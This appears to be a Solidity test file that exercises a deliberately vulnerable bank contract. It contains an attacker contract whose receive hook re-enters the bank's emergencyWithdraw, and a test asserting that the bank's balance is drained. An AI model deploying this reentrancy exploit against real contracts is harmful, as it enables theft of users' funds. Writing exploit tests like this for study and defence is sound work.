// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../src/VulnerableBank.sol";

interface Vm {
    function deal(address who, uint256 newBalance) external;
    function prank(address who) external;
}

contract BankAttacker {
    VulnerableBank public target;
    uint256 public count;

    constructor(address payable _target) {
        target = VulnerableBank(_target);
    }

    function attack() external payable {
        target.deposit{value: 2 ether}();
        target.withdraw(1 ether);
    }

    receive() external payable {
        if (count < 1 && address(target).balance >= 1 ether) {
            count++;
            target.emergencyWithdraw();
        }
    }
}

contract VulnerableBankTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    VulnerableBank bank;
    BankAttacker attacker;

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new BankAttacker(payable(address(bank)));
        vm.deal(address(bank), 5 ether);
        vm.deal(address(attacker), 2 ether);
    }

    function testReentrancyExploit() public {
        uint256 bankBalBefore = address(bank).balance;
        attacker.attack{value: 1 ether}();
        uint256 bankBalAfter = address(bank).balance;
        require(bankBalAfter < bankBalBefore, "Reentrancy exploit: VulnerableBank balance drained");
    }
}
